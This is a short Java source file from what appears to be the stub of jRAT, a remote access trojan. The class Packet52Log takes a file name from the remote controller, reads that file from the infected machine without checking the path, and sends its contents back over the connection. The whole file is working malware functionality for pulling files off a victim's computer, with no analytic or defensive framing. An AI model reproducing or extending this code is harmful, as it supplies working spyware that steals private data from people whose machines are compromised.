package pro.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import pro.jrat.stub.Connection;
import pro.jrat.stub.utils.Utils;

public class Packet52Log extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String what = Connection.readLine();
		File file = new File(Utils.getPath().getAbsolutePath() + File.separator + what);
		FileInputStream in = new FileInputStream(file);
		BufferedReader reader = new BufferedReader(new InputStreamReader(in));
		String log = "";

		String line;

		while ((line = reader.readLine()) != null) {
			log += line + "\n";
		}
		reader.close();
		Connection.writeLine("LOG");
		Connection.writeLine(what);
		Connection.writeLine(log);
	}

}
